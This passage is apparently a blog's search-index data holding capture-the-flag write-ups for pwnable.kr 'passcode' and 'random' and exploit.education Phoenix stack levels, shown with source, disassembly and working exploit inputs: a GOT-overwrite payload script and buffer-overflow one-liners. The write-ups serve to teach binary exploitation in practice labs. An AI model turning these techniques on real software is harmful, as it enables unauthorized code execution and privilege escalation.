privelege restrictions   It seems like we cannot view our flag directly as usual   We have to find a way through the binary   passcode@pwnable:~$ whoami passcode passcode@pwnable:~$ cat flag cat: flag: Permission denied   Lets view the source code of the binary,   passcode@pwnable:~$ cat passcode.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;  void login(){ \tint passcode1; \tint passcode2;  \tprintf(\"enter passcode1 : \"); \tscanf(\"%d\", passcode1); \tfflush(stdin);  \t// ha! mommy told me that 32bit is vulnerable to bruteforcing :) \tprintf(\"enter passcode2 : \");         scanf(\"%d\", passcode2);  \tprintf(\"checking...\\n\"); \tif(passcode1==338150 &amp;&amp; passcode2==13371337){                 printf(\"Login OK!\\n\");                 system(\"/bin/cat flag\");         }         else{                 printf(\"Login Failed!\\n\"); \t\texit(0);         } }  void welcome(){ \tchar name[100]; \tprintf(\"enter you name : \"); \tscanf(\"%100s\", name); \tprintf(\"Welcome %s!\\n\", name); }  int main(){ \tprintf(\"Toddler's Secure Login System 1.0 beta.\\n\");  \twelcome(); \tlogin();  \t// something after login... \tprintf(\"Now I can safely trust you that you have credential :)\\n\"); \treturn 0;\t }   Now lets check the file type of our binary using file command   passcode@pwnable:~$ file passcode passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped   So it is a not stripped binary   We can easily view the symbols in debugger   Now lets try running it,   passcode@pwnable:~$ ./passcode Toddler's Secure Login System 1.0 beta. enter you name : monish Welcome monish! enter passcode1 : aidenpearce369 enter passcode2 : checking... Login Failed!   We have to check the conditions and pass it inorder to get the flag   From the source code we can see,           passcode1==338150 &amp;&amp; passcode2==13371337 for passwords            scanf(\"%d\", passcode1); and scanf(\"%d\", passcode2); which stores passwords as int       Now lets try with these,   passcode@pwnable:~$ ./passcode Toddler's Secure Login System 1.0 beta. enter you name : monish Welcome monish! enter passcode1 : 338150 Segmentation fault (core dumped) passcode@pwnable:~$ ./passcode Toddler's Secure Login System 1.0 beta. enter you name : monish Welcome monish! enter passcode1 : 13371337 Segmentation fault (core dumped)   It fails!!   Segmentation fault (core dumped) from our input can be created by memory crash   Our assumption is that our int data should be a memory address   Lets try by analyzing it,   Copying the file from remote to local by scp   ra@moni~&gt; scp -P 2222 passcode@128.61.240.205:passcode  /home/ra/PWNPractice/pwnable.kr/passcode/ passcode@128.61.240.205's password: passcode                                                          100% 7485    14.0KB/s   00:00   Opening it in debuggers, and listing available functions   pwndbg&gt; info functions All defined functions:  Non-debugging symbols: 0x080483e0  _init 0x08048420  printf@plt 0x08048430  fflush@plt 0x08048440  __stack_chk_fail@plt 0x08048450  puts@plt 0x08048460  system@plt 0x08048470  __gmon_start__@plt 0x08048480  exit@plt 0x08048490  __libc_start_main@plt 0x080484a0  __isoc99_scanf@plt 0x080484b0  _start 0x080484e0  __do_global_dtors_aux 0x08048540  frame_dummy 0x08048564  login 0x08048609  welcome 0x08048665  main 0x080486a0  __libc_csu_init 0x08048710  __libc_csu_fini 0x08048712  __i686.get_pc_thunk.bx 0x08048720  __do_global_ctors_aux 0x0804874c  _fini   Disassembling main(),   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x08048665 &lt;+0&gt;:\t    push   ebp    0x08048666 &lt;+1&gt;:\t    mov    ebp,esp    0x08048668 &lt;+3&gt;:\t    and    esp,0xfffffff0    0x0804866b &lt;+6&gt;:\t    sub    esp,0x10    0x0804866e &lt;+9&gt;:\t    mov    DWORD PTR [esp],0x80487f0    0x08048675 &lt;+16&gt;:\tcall   0x8048450 &lt;puts@plt&gt;    0x0804867a &lt;+21&gt;:\tcall   0x8048609 &lt;welcome&gt;    0x0804867f &lt;+26&gt;:\tcall   0x8048564 &lt;login&gt;    0x08048684 &lt;+31&gt;:\tmov    DWORD PTR [esp],0x8048818    0x0804868b &lt;+38&gt;:\tcall   0x8048450 &lt;puts@plt&gt;    0x08048690 &lt;+43&gt;:\tmov    eax,0x0    0x08048695 &lt;+48&gt;:\tleave    0x08048696 &lt;+49&gt;:\tret End of assembler dump.   Disassembling welcome()   pwndbg&gt; disassemble welcome Dump of assembler code for function welcome:    0x08048609 &lt;+0&gt;:\t    push   ebp    0x0804860a &lt;+1&gt;:\t    mov    ebp,esp    0x0804860c &lt;+3&gt;:\t    sub    esp,0x88    0x08048612 &lt;+9&gt;:\t    mov    eax,gs:0x14    0x08048618 &lt;+15&gt;:\tmov    DWORD PTR [ebp-0xc],eax    0x0804861b &lt;+18&gt;:\txor    eax,eax    0x0804861d &lt;+20&gt;:\tmov    eax,0x80487cb    0x08048622 &lt;+25&gt;:\tmov    DWORD PTR [esp],eax    0x08048625 &lt;+28&gt;:\tcall   0x8048420 &lt;printf@plt&gt;    0x0804862a &lt;+33&gt;:\tmov    eax,0x80487dd    0x0804862f &lt;+38&gt;:\tlea    edx,[ebp-0x70]    0x08048632 &lt;+41&gt;:\tmov    DWORD PTR [esp+0x4],edx    0x08048636 &lt;+45&gt;:\tmov    DWORD PTR [esp],eax    0x08048639 &lt;+48&gt;:\tcall   0x80484a0 &lt;__isoc99_scanf@plt&gt;    0x0804863e &lt;+53&gt;:\tmov    eax,0x80487e3    0x08048643 &lt;+58&gt;:\tlea    edx,[ebp-0x70]    0x08048646 &lt;+61&gt;:\tmov    DWORD PTR [esp+0x4],edx    0x0804864a &lt;+65&gt;:\tmov    DWORD PTR [esp],eax    0x0804864d &lt;+68&gt;:\tcall   0x8048420 &lt;printf@plt&gt;    0x08048652 &lt;+73&gt;:\tmov    eax,DWORD PTR [ebp-0xc]    0x08048655 &lt;+76&gt;:\txor    eax,DWORD PTR gs:0x14    0x0804865c &lt;+83&gt;:\tje     0x8048663 &lt;welcome+90&gt;    0x0804865e &lt;+85&gt;:\tcall   0x8048440 &lt;__stack_chk_fail@plt&gt;    0x08048663 &lt;+90&gt;:\tleave    0x08048664 &lt;+91&gt;:\tret End of assembler dump.   Disassembling login(),   pwndbg&gt; disassemble login Dump of assembler code for function login:    0x08048564 &lt;+0&gt;:\t    push   ebp    0x08048565 &lt;+1&gt;:\t    mov    ebp,esp    0x08048567 &lt;+3&gt;:\t    sub    esp,0x28    0x0804856a &lt;+6&gt;:\t    mov    eax,0x8048770    0x0804856f &lt;+11&gt;:\tmov    DWORD PTR [esp],eax    0x08048572 &lt;+14&gt;:\tcall   0x8048420 &lt;printf@plt&gt;    0x08048577 &lt;+19&gt;:\tmov    eax,0x8048783    0x0804857c &lt;+24&gt;:\tmov    edx,DWORD PTR [ebp-0x10]    0x0804857f &lt;+27&gt;:\tmov    DWORD PTR [esp+0x4],edx    0x08048583 &lt;+31&gt;:\tmov    DWORD PTR [esp],eax    0x08048586 &lt;+34&gt;:\tcall   0x80484a0 &lt;__isoc99_scanf@plt&gt;    0x0804858b &lt;+39&gt;:\tmov    eax,ds:0x804a02c    0x08048590 &lt;+44&gt;:\tmov    DWORD PTR [esp],eax    0x08048593 &lt;+47&gt;:\tcall   0x8048430 &lt;fflush@plt&gt;    0x08048598 &lt;+52&gt;:\tmov    eax,0x8048786    0x0804859d &lt;+57&gt;:\tmov    DWORD PTR [esp],eax    0x080485a0 &lt;+60&gt;:\tcall   0x8048420 &lt;printf@plt&gt;    0x080485a5 &lt;+65&gt;:\tmov    eax,0x8048783    0x080485aa &lt;+70&gt;:\tmov    edx,DWORD PTR [ebp-0xc]    0x080485ad &lt;+73&gt;:\tmov    DWORD PTR [esp+0x4],edx    0x080485b1 &lt;+77&gt;:\tmov    DWORD PTR [esp],eax    0x080485b4 &lt;+80&gt;:\tcall   0x80484a0 &lt;__isoc99_scanf@plt&gt;    0x080485b9 &lt;+85&gt;:\tmov    DWORD PTR [esp],0x8048799    0x080485c0 &lt;+92&gt;:\tcall   0x8048450 &lt;puts@plt&gt;    0x080485c5 &lt;+97&gt;:\tcmp    DWORD PTR [ebp-0x10],0x528e6    0x080485cc &lt;+104&gt;:\tjne    0x80485f1 &lt;login+141&gt;    0x080485ce &lt;+106&gt;:\tcmp    DWORD PTR [ebp-0xc],0xcc07c9    0x080485d5 &lt;+113&gt;:\tjne    0x80485f1 &lt;login+141&gt;    0x080485d7 &lt;+115&gt;:\tmov    DWORD PTR [esp],0x80487a5    0x080485de &lt;+122&gt;:\tcall   0x8048450 &lt;puts@plt&gt;    0x080485e3 &lt;+127&gt;:\tmov    DWORD PTR [esp],0x80487af    0x080485ea &lt;+134&gt;:\tcall   0x8048460 &lt;system@plt&gt;    0x080485ef &lt;+139&gt;:\tleave    0x080485f0 &lt;+140&gt;:\tret    0x080485f1 &lt;+141&gt;:\tmov    DWORD PTR [esp],0x80487bd    0x080485f8 &lt;+148&gt;:\tcall   0x8048450 &lt;puts@plt&gt;    0x080485fd &lt;+153&gt;:\tmov    DWORD PTR [esp],0x0    0x08048604 &lt;+160&gt;:\tcall   0x8048480 &lt;exit@plt&gt; End of assembler dump.   When we try to compile the binary from souce code (given in clue),   ra@moni~/P/p/passcode&gt; nano passcode.c ra@moni~/P/p/passcode&gt; gcc -o test passcode.c passcode.c: In function ‘login’: passcode.c:9:10: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘in ’ [-Wformat=]     9 |  scanf(\"%d\", passcode1);       |         ~^   ~~~~~~~~~       |          |   |       |          |   int       |          int * passcode.c:14:17: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]    14 |         scanf(\"%d\", passcode2);       |                ~^   ~~~~~~~~~       |                 |   |       |                 |   int       |                 int *   So we have confirmed that it is a int * pointer   Thats the reason of segmentation fault   It is storing its input in the passcode1 and passcode2 values by assuming it as address   If we see here clearly,       int passcode1;     int passcode2;      printf(\"enter passcode1 : \");     scanf(\"%d\", passcode1);     fflush(stdin);  \tprintf(\"enter passcode2 : \");     scanf(\"%d\", passcode2);   Here already passcode1 and passcode1 are already int   Normally we would pass scanf(\"%d\", &amp;passcode1) and scanf(\"%d\", &amp;passcode1) to store the inputs in the address   But here,In scanf(\"%d\", passcode1) and scanf(\"%d\", passcode1) we are trying to store the int input inside the address of int values declared above   Now we understood the use of int variables and scanf() functions   The main logic of the program lies on,   if(passcode1==338150 &amp;&amp; passcode2==13371337){                 printf(\"Login OK!\\n\");                 system(\"/bin/cat flag\");         }   Here is another interesting part from login(),   0x080485c5 &lt;+97&gt;:\tcmp    DWORD PTR [ebp-0x10],0x528e6 0x080485cc &lt;+104&gt;:\tjne    0x80485f1 &lt;login+141&gt; 0x080485ce &lt;+106&gt;:\tcmp    DWORD PTR [ebp-0xc],0xcc07c9 0x080485d5 &lt;+113&gt;:\tjne    0x80485f1 &lt;login+141&gt;   And from the line if(passcode1==338150 &amp;&amp; passcode2==13371337),   &gt;&gt;&gt; hex(13371337) '0xcc07c9' &gt;&gt;&gt; hex(338150) '0x528e6'   So its comparing correctly, but where did this variable gets stored   The possibility of controlling the condition with passcode1 and passcode2 variables is a question mark?   Lets try another approach..   We have 1 scanf() from welcome() and 2 scanf() from login()   So our variables get stored respectively in this order   In welcome(),      0x08048639 &lt;+48&gt;:\tcall   0x80484a0 &lt;__isoc99_scanf@plt&gt;    0x0804863e &lt;+53&gt;:\tmov    eax,0x80487e3    0x08048643 &lt;+58&gt;:\tlea    edx,[ebp-0x70]   Here lea (Load Effectie Address) is used to allocate the buffer space for our name   In login(),   For password1      0x0804857c &lt;+24&gt;:\tmov    edx,DWORD PTR [ebp-0x10]    0x0804857f &lt;+27&gt;:\tmov    DWORD PTR [esp+0x4],edx    0x08048583 &lt;+31&gt;:\tmov    DWORD PTR [esp],eax    0x08048586 &lt;+34&gt;:\tcall   0x80484a0 &lt;__isoc99_scanf@plt&gt;   For password2      0x080485aa &lt;+70&gt;:\tmov    edx,DWORD PTR [ebp-0xc]    0x080485ad &lt;+73&gt;:\tmov    DWORD PTR [esp+0x4],edx    0x080485b1 &lt;+77&gt;:\tmov    DWORD PTR [esp],eax    0x080485b4 &lt;+80&gt;:\tcall   0x80484a0 &lt;__isoc99_scanf@plt&gt;   On overall,   [ebp-0x70] ---&gt; name  [ebp-0x10] ---&gt; password1  [ebp-0xc]  ---&gt; password2    Lets find the distance between these variables,           Distance between name and password1 = 0x70 - 0x10 = 0x60 = 96            Distance between password1 and password2 = 0x10 - 0xc = 4       So passcode1 occupies the last 4 bytes of name[100]   Since we are using scanf() to get inputs, we can attack with it by our input   It is time to perform “arbitrary write/GOT overwrite” with this buffer   For more on GOT Overwrite   Lets try it on the binary,   The GOT and GOT-PLT from this program,   pwndbg&gt; gotplt 0x804a000: printf@got.plt 0x804a004: fflush@got.plt 0x804a008: __stack_chk_fail@got.plt 0x804a00c: puts@got.plt 0x804a010: system@got.plt 0x804a014: __gmon_start__@got.plt 0x804a018: exit@got.plt 0x804a01c: __libc_start_main@got.plt 0x804a020: __isoc99_scanf@got.plt pwndbg&gt; got  GOT protection: Partial RELRO | GOT functions: 9  [0x804a000] printf@GLIBC_2.0 -&gt; 0xf7d63340 (printf) ◂— endbr32 [0x804a004] fflush@GLIBC_2.0 -&gt; 0x8048436 (fflush@plt+6) ◂— push   8 [0x804a008] __stack_chk_fail@GLIBC_2.4 -&gt; 0x8048446 (__stack_chk_fail@plt+6) ◂— push   0x10 [0x804a00c] puts@GLIBC_2.0 -&gt; 0xf7d80cd0 (puts) ◂— endbr32 [0x804a010] system@GLIBC_2.0 -&gt; 0x8048466 (system@plt+6) ◂— push   0x20 /* 'h ' */ [0x804a014] __gmon_start__ -&gt; 0x8048476 (__gmon_start__@plt+6) ◂— push   0x28 /* 'h(' */ [0x804a018] exit@GLIBC_2.0 -&gt; 0x8048486 (exit@plt+6) ◂— push   0x30 /* 'h0' */ [0x804a01c] __libc_start_main@GLIBC_2.0 -&gt; 0xf7d2ddf0 (__libc_start_main) ◂— endbr32 [0x804a020] __isoc99_scanf@GLIBC_2.7 -&gt; 0xf7d64440 (__isoc99_scanf) ◂— endbr32   We know we could control passcode1 from name   We can write the passcode1 value with the last 4 bytes from name   So we can use this to perform “GOT hijacking”   If we pass  GOT address value of some function in passcode1,and the scanf() function gets the neccessary argument in int format, the function gets executed correctly   Here fflush() is the perfect target for GOT Overwrite   For fflush(),   [0x804a004] fflush@GLIBC_2.0 -&gt; 0x8048436 (fflush@plt+6) ◂— push   8   The GOT address of fflush() is 0x804a004   Now with 96 bytes of junk we will be passing this GOT value of fflush() so that our “input1” will be passed as argument to this fflush()   ie. password1 = fflush;     scanf(“%d”, fflush)   It becomes fflush(input)   Now its time for exploit,      0x080485e3 &lt;+127&gt;:\tmov    DWORD PTR [esp],0x80487af    0x080485ea &lt;+134&gt;:\tcall   0x8048460 &lt;system@plt&gt;    0x080485ef &lt;+139&gt;:\tleave  Here 0x080485ea is the important function to display our flag, we will pass this to fflush(stdin)   ra@moni~/P/p/passcode&gt; cat exploit.py from pwn import * data='A'*96 data+=p32(0x804a004) data+=str(0x080485ea) print(data)   Our payload = 96 bytes junk + GOT of fflush() + args for fflush() passed in scanf()   ra@moni~/P/p/passcode&gt; python exploit.py AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x04\\x04134514154 ra@moni~/P/p/passcode&gt; python exploit.py &gt; exploit ra@moni~/P/p/passcode&gt; cat exploit AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA134514154   Now lets test it locally,   ra@moni:~/PWNPractice/pwnable.kr/passcode$ cat exploit | ./passcode Toddler's Secure Login System 1.0 beta. enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA! sh: 1: Syntax error: word unexpected (expecting \")\") enter passcode1 : Now I can safely trust you that you have credential :)   Its time to test it on server,   passcode@pwnable:~$ python -c \"print('A' * 96 + '\\x04\\xa0\\x04\\x08' + '134514147')\" AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA134514147 passcode@pwnable:~$ python -c \"print('A' * 96 + '\\x04\\xa0\\x04\\x08' + '134514147')\" | ./passcode Toddler's Secure Login System 1.0 beta. enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA! Sorry mom.. I got confused about scanf usage :( enter passcode1 : Now I can safely trust you that you have credential :)   Done! we got the flag   Flag: Now I can safely trust you that you have credential :)  ","categories": ["Pwn"],
        "tags": ["collision attack","got overwrite"],
        "url": "http://localhost:4000/pwn/2-passcode/",
        "teaser": "http://localhost:4000/assets/images/pwn/pwn.png"
      },{
        "title": "pwnable.kr - random",
        "excerpt":"Lets connect to the server   ra@moni~/P/p/random&gt; ssh random@128.61.240.205 -p 2222 random@128.61.240.205's password:  ____  __    __  ____    ____  ____   _        ___      __  _  ____ |    \\|  |__|  ||    \\  /    ||    \\ | |      /  _]    |  |/ ]|    \\ |  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  ) |   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \\ |    / |  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \\|    \\ |  |   \\      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \\ |__|    \\_/\\_/  |__|__||__|__||_____||_____||_____||__||__|\\_||__|\\_|  - Site admin : daehee87@gatech.edu - IRC : irc.netgarage.org:6667 / #pwnable.kr - Simply type \"irssi\" command to join IRC now - files under /tmp can be erased anytime. make your directory under /tmp - to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal You have new mail. Last login: Fri Jun  4 17:29:35 2021 from 82.196.111.219 random@pwnable:~$   Lets list the files using ls -la,   random@pwnable:~$ ls -la total 40 drwxr-x---   5 root       random 4096 Oct 23  2016 . drwxr-xr-x 115 root       root   4096 Dec 22 08:10 .. d---------   2 root       root   4096 Jun 30  2014 .bash_history -r--r-----   1 random_pwn root     49 Jun 30  2014 flag dr-xr-xr-x   2 root       root   4096 Aug 20  2014 .irssi drwxr-xr-x   2 root       root   4096 Oct 23  2016 .pwntools-cache -r-sr-x---   1 random_pwn random 8538 Jun 30  2014 random -rw-r--r--   1 root       root    301 Jun 30  2014 random.c   As usual there are some privilege restrictions to access the flag,we have to read it through our binary   Lets analyze the file type of our binary using file command,  random@pwnable:~$ file random random: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=f4eac0a1434a84aef72dfabfc1f889e6f6f73023, not stripped   So it is a not stripped binary   Lets view the source code of the binary,   random@pwnable:~$ cat random.c #include &lt;stdio.h&gt;  int main(){ \tunsigned int random; \trandom = rand();\t// random value!  \tunsigned int key=0; \tscanf(\"%d\", &amp;key);  \tif( (key ^ random) == 0xdeadbeef ){ \t\tprintf(\"Good!\\n\"); \t\tsystem(\"/bin/cat flag\"); \t\treturn 0; \t}  \tprintf(\"Wrong, maybe you should try 2^32 cases.\\n\"); \treturn 0; }   Lets try running our binary,   random@pwnable:~$ ./random 12 Wrong, maybe you should try 2^32 cases. random@pwnable:~$ ./random 1234 Wrong, maybe you should try 2^32 cases. random@pwnable:~$ ./random 3735928559 Wrong, maybe you should try 2^32 cases.   So its expecting a different input   To bypass this we need to find that rand() is producing random output or fixed one   ra@moni~/P/p/random&gt; cat test.c #include &lt;stdio.h&gt;  int main(){ \tunsigned int random; \trandom = rand(); \tprintf(\"Random is %d\",random); \treturn 0; } ra@moni~/P/p/random&gt; gcc -o test test.c test.c: In function ‘main’: test.c:5:11: warning: implicit declaration of function ‘rand’ [-Wimplicit-function-declaration]     5 |  random = rand();       |           ^~~~ ra@moni~/P/p/random&gt; ./test Random is 1804289383                                                                               ra@moni~/P/p/random&gt; ./test Random is 1804289383                                                                               ra@moni~/P/p/random&gt; ./test Random is 1804289383                                                                                ra@moni~/P/p/random&gt; ./test Random is 1804289383                                                                                ra@moni~/P/p/random&gt; ./test Random is 1804289383   NOTE   rand() is not a secure function to implement in programs   So this rand() produces same output because the seed in it is not initialized,if there is different seed each time it would create a different random number   Here rand() is called with default seed (1),thus it produces the same output for random number   To prevent this type of security failure by rand() for pseudo random number generation, use srand()   We know that the condition to pass the program is,   if( (key ^ random) == 0xdeadbeef )   Now random gives 1804289383,   key is our input,   If random performs xor operation with key it should give 0xdeadbeef as result,   On converting int to hex,   &gt;&gt;&gt; hex(1804289383) '0x6b8b4567'   So 0x6b8b4567 ^ key == 0xdeadbeef,   Its time for mathematical calculation (Converting into binary format),   0x6b8b4567 = 1101011100010110100010101100111  0xdeadbeef = 11011110101011011011111011101111   To find the key just XOR these,   I used Online XOR Calculator   So our key value should be ,   In hex —&gt; 0xb526fb88   In int —&gt; 3039230856   Now if we pass this int type key in the input,we get our flag   random@pwnable:~$ ./random 3039230856 Good! Mommy, I thought libc random is unpredictable...   Done! We got our flag   Flag: Mommy, I thought libc random is unpredictable...   ","categories": ["Pwn"],
        "tags": [],
        "url": "http://localhost:4000/pwn/1-random/",
        "teaser": "http://localhost:4000/assets/images/pwn/pwn.png"
      },{
        "title": "phoenix - stack 0",
        "excerpt":"Lets list our files using ls -la,   user@phoenix-amd64:~$ ls -la total 28 drwxr-xr-x 2 user user 4096 Jun  6 02:49 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw-r--r-- 1 user user  675 Jan 13  2019 .profile -rwxr-xr-x 1 user user 5824 Jun  6 02:49 stack-zero   Lets try running the binary,   user@phoenix-amd64:~$ ./stack-zero Welcome to phoenix/stack-zero, brought to you by https://exploit.education monish Uh oh, 'changeme' has not yet been changed. Would you like to try again?   It is expecting to change some changeme in it   Lets analyse this binary using file command,   user@phoenix-amd64:~$ file stack-zero stack-zero: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped   It is a not stripped binary   Its time for our debugger to analyse it,   Viewing functions inside in it   pwndbg&gt; info functions All defined functions:  Non-debugging symbols: 0x0000000000400408  _init 0x0000000000400430  gets@plt 0x0000000000400440  puts@plt 0x0000000000400450  exit@plt 0x0000000000400460  __libc_start_main@plt 0x0000000000400470  _start 0x0000000000400486  _start_c 0x00000000004004b0  deregister_tm_clones 0x00000000004004e0  register_tm_clones 0x0000000000400520  __do_global_dtors_aux 0x00000000004005b0  frame_dummy 0x00000000004005dd  main 0x0000000000400630  __do_global_ctors_aux 0x0000000000400672  _fini   Lets view the main(),   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x00000000004005dd &lt;+0&gt;:\t  push   rbp    0x00000000004005de &lt;+1&gt;:\t  mov    rbp,rsp    0x00000000004005e1 &lt;+4&gt;:\t  sub    rsp,0x60    0x00000000004005e5 &lt;+8&gt;:\t  mov    DWORD PTR [rbp-0x54],edi    0x00000000004005e8 &lt;+11&gt;:\tmov    QWORD PTR [rbp-0x60],rsi    0x00000000004005ec &lt;+15&gt;:\tmov    edi,0x400680    0x00000000004005f1 &lt;+20&gt;:\tcall   0x400440 &lt;puts@plt&gt;    0x00000000004005f6 &lt;+25&gt;:\tmov    DWORD PTR [rbp-0x10],0x0    0x00000000004005fd &lt;+32&gt;:\tlea    rax,[rbp-0x50]    0x0000000000400601 &lt;+36&gt;:\tmov    rdi,rax    0x0000000000400604 &lt;+39&gt;:\tcall   0x400430 &lt;gets@plt&gt;    0x0000000000400609 &lt;+44&gt;:\tmov    eax,DWORD PTR [rbp-0x10]    0x000000000040060c &lt;+47&gt;:\ttest   eax,eax    0x000000000040060e &lt;+49&gt;:\tje     0x40061c &lt;main+63&gt;    0x0000000000400610 &lt;+51&gt;:\tmov    edi,0x4006d0    0x0000000000400615 &lt;+56&gt;:\tcall   0x400440 &lt;puts@plt&gt;    0x000000000040061a &lt;+61&gt;:\tjmp    0x400626 &lt;main+73&gt;    0x000000000040061c &lt;+63&gt;:\tmov    edi,0x400708    0x0000000000400621 &lt;+68&gt;:\tcall   0x400440 &lt;puts@plt&gt;    0x0000000000400626 &lt;+73&gt;:\tmov    edi,0x0    0x000000000040062b &lt;+78&gt;:\tcall   0x400450 &lt;exit@plt&gt; End of assembler dump.   Lets view the source code of this binary for better understanding,   Source   #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *gets(char *);  int main(int argc, char **argv) {   struct {     char buffer[64];     volatile int changeme;   } locals;    printf(\"%s\\n\", BANNER);    locals.changeme = 0;   gets(locals.buffer);    if (locals.changeme != 0) {     puts(\"Well done, the 'changeme' variable has been changed!\");   } else {     puts(         \"Uh oh, 'changeme' has not yet been changed. Would you like to try \"         \"again?\");   }    exit(0); }   Here is the important part,   char buffer[64]; volatile int changeme;   buffer gets 64 bytes of data using gets(locals.buffer)   volatile int changeme is handled by locals.changeme = 0   And the main condition to pass the program is,   if (locals.changeme != 0) {     puts(\"Well done, the 'changeme' variable has been changed!\");   } else {     puts(         \"Uh oh, 'changeme' has not yet been changed. Would you like to try \"         \"again?\");   }   If we manage to change the changeme variable to a value other than 0,we can complete this challenge   Lets check the security mitigations of this binary using checksec,   ra@moni~/E/p/stack0&gt; checksec stack-zero [*] '/home/ra/ExpDevPractice/phoenix/stack0/stack-zero'     Arch:     amd64-64-little     RELRO:    No RELRO     Stack:    No canary found     NX:       NX disabled     PIE:      No PIE (0x400000)     RWX:      Has RWX segments     RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'   It seems like this binary has no security mitigations   We could overwrite the changeme variable from buffer by overflowing it   Since buffer uses gets() for input,we can use this for overflow   If we check it in debugger,      0x00000000004005f1 &lt;+20&gt;:\tcall   0x400440 &lt;puts@plt&gt;    0x00000000004005f6 &lt;+25&gt;:\tmov    DWORD PTR [rbp-0x10],0x0    0x00000000004005fd &lt;+32&gt;:\tlea    rax,[rbp-0x50]    0x0000000000400601 &lt;+36&gt;:\tmov    rdi,rax    0x0000000000400604 &lt;+39&gt;:\tcall   0x400430 &lt;gets@plt&gt;   Here mov    DWORD PTR [rbp-0x10],0x0 is used for locals.changeme = 0   And lea    rax,[rbp-0x50] is for allocating buffer space for buffer   Calculating the distance of these memory,   &gt;&gt;&gt; int(0x50) 80 &gt;&gt;&gt; int(0x10) 16 &gt;&gt;&gt; print(80-16) 64   If we could pass 64 bytes of buffer and 1 extra byte to buffer it would change the changeme variable   Lets try it,   user@phoenix-amd64:~$ python -c \"print('A'*64)\" AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA user@phoenix-amd64:~$ python -c \"print('A'*64)\" | ./stack-zero Welcome to phoenix/stack-zero, brought to you by https://exploit.education Uh oh, 'changeme' has not yet been changed. Would you like to try again? user@phoenix-amd64:~$ python -c \"print('A'*65)\" AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA user@phoenix-amd64:~$ python -c \"print('A'*65)\" | ./stack-zero Welcome to phoenix/stack-zero, brought to you by https://exploit.education Well done, the 'changeme' variable has been changed!   Done!   ","categories": ["Binary Exploitation"],
        "tags": ["buffer overflow"],
        "url": "http://localhost:4000/binary%20exploitation/1-stack0/",
        "teaser": "http://localhost:4000/assets/images/binary-exploitation/binexp.png"
      },{
        "title": "phoenix - stack 1",
        "excerpt":"Lets list our files using ls -la,   user@phoenix-amd64:~$ ls -la total 28 drwxr-xr-x 2 user user 4096 Jun  6 03:42 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw-r--r-- 1 user user  675 Jan 13  2019 .profile -rwxr-xr-x 1 user user 6176 Jun  6 03:41 stack-one   Lets view our file type of the binary using file command,  user@phoenix-amd64:~$ file stack-one stack-one: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped   It is a not stripped binary   Lets try running it,   user@phoenix-amd64:~$ ./stack-one Welcome to phoenix/stack-one, brought to you by https://exploit.education stack-one: specify an argument, to be copied into the \"buffer\" user@phoenix-amd64:~$ ./stack-one monish Welcome to phoenix/stack-one, brought to you by https://exploit.education Getting closer! changeme is currently 0x00000000, we want 0x496c5962   It seems like we have to overwrite the 0x496c5962 value into the changeme variable   We didn’t overwrite it yet,so it displays 0x00000000 in it   Lets view our binary in debugger,   Lets view the functions in it,   pwndbg&gt; info functions All defined functions:  Non-debugging symbols: 0x0000000000400478  _init 0x00000000004004a0  strcpy@plt 0x00000000004004b0  printf@plt 0x00000000004004c0  puts@plt 0x00000000004004d0  errx@plt 0x00000000004004e0  exit@plt 0x00000000004004f0  __libc_start_main@plt 0x0000000000400500  _start 0x0000000000400516  _start_c 0x0000000000400540  deregister_tm_clones 0x0000000000400570  register_tm_clones 0x00000000004005b0  __do_global_dtors_aux 0x0000000000400640  frame_dummy 0x000000000040066d  main 